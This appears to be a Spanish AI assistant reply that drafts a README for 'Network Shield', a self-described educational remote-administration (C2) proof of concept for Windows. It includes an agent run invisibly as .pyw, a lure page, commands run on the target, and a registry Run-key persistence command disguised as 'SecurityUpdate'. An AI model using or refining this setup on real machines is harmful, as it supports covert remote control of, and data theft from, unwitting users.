¡Entendido! Vamos a crear el README.md definitivo. He aplicado un diseño de "Arquitectura Limpia", separando cada sección con líneas horizontales, usando tablas para la estructura de archivos y bloques de código con resaltado sintáctico.Este diseño es el que usan los desarrolladores en GitHub para que sus proyectos destaquen.📄 Borra TODO tu archivo README.md y pega exactamente esto:Markdown# 🛡️ Network Shield - Remote Administration System (PoC)

Este proyecto es una **Prueba de Concepto (PoC)** diseñada para estudiar el funcionamiento de los sistemas de administración remota (C2) y las técnicas de persistencia en entornos Windows.

> [!CAUTION]
> **⚠️ AVISO LEGAL:** Este software ha sido creado exclusivamente con fines educativos y de investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código. El uso en sistemas sin autorización es ilegal.

---

## 🛠️ Requisitos del Sistema

Para el correcto funcionamiento del ecosistema, asegúrate de tener instalado:

* **XAMPP**: Servidor Apache y MySQL (MariaDB).
* **Python 3.x**: Instalado en el PATH.
* **Librerías**: Ejecuta `pip install requests` en tu terminal.
* **Base de Datos**: Importar el esquema incluido en `server/db.txt`.

---

## 🚀 Guía de Instalación y Configuración

### 1. Preparación de la Base de Datos
1.  Inicia **Apache** y **MySQL** desde el panel de XAMPP.
2.  Accede a `http://localhost/phpmyadmin`.
3.  Crea una base de datos llamada `network_shield_db`.
4.  Importa el contenido de `server/db.txt` en la pestaña **SQL**.

### 2. Configuración del Servidor Web
1.  Mueve la carpeta `Network-Shield-System` a `C:\xampp\htdocs\`.
2.  El panel será accesible en: `http://localhost/Network-Shield-System/server/index.php`.

---

## 📡 Ejecución y Pruebas

Sigue este orden estricto para establecer el enlace:

### 🟢 Paso 1: Iniciar el Receptor (Master)
Abre una terminal en la carpeta `master/` y lanza el centro de control:
```bash
python receptor.py
🔵 Paso 2: Lanzar el Agente (Client)Modo Manual: Ejecuta python client/agente.py.Modo Invisible: Renombra a agente.pyw y ejecútalo.Simulación Web: Accede a http://localhost/Network-Shield-System/server/trampa.php.🔐 Implementación de PersistenciaLa persistencia permite que el agente se ejecute automáticamente al iniciar sesión en Windows.1️⃣ Instalación (Crear Registro)Ejecuta esto desde la terminal del receptor (Master):DOSreg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f
2️⃣ Comprobación (Verificar Estado)Para confirmar que el registro existe:DOSreg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"
3️⃣ Eliminación (Limpieza)Para borrar el rastro de inicio automático:DOSreg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
📂 Estructura del RepositorioCarpetaArchivo PrincipalFunción del Móduloserver/index.phpPanel de control web y base de datos.client/agente.pyEjecución de comandos en el objetivo.master/receptor.pyConsola interactiva C2 (Command & Control).📋 Comandos de Auditoría DisponiblesUna vez vinculado el agente, puedes utilizar:💻 Sistema: whoami, systeminfo, tasklist, ipconfig.📂 Archivos: dir, cd .., type archivo.txt.🌐 Remoto: start https://google.com, msg * "Acceso detectado".🚪 Sesión: exit (Cierra la conexión de forma segura).🛠️ Troubleshooting (Solución de Problemas)[!IMPORTANT]¿No conecta? Verifica que el puerto 4444 esté abierto en el Firewall.¿No aparece en la Web? Revisa que la URL en agente.py sea correcta.¿Error de SQL? Asegúrate de que el usuario de MySQL sea root sin contraseña.🔄 Registro de Cambios RecientesEstructura: Migración completa a arquitectura modular (Client/Server/Master).Interfaz: Terminal web actualizada con estilo "Hacker Green".Agente: Mejorada la detección de IP local y persistencia silenciosa.
### 💡 Por qué este diseño funciona:
1.  **Jerarquía**: Los encabezados (`#`, `##`, `###`) están bien definidos.
2.  **Visuales**: Uso de emojis para identificar secciones rápidamente (🚀, 🔐, 📂).
3.  **GitHub Blocks**: He añadido bloques especiales como `> [!CAUTION]` y `> [!IMPORTANT]` que GitHub resalta con colores (rojo y azul) para avisos importantes.
4.  **Escalabilidad**: Las tablas permiten ver la estructura de un vistazo.

**¿Qué te parece? Si lo pegas y le das a "Preview" en VS Code, verás que es el manual más profe
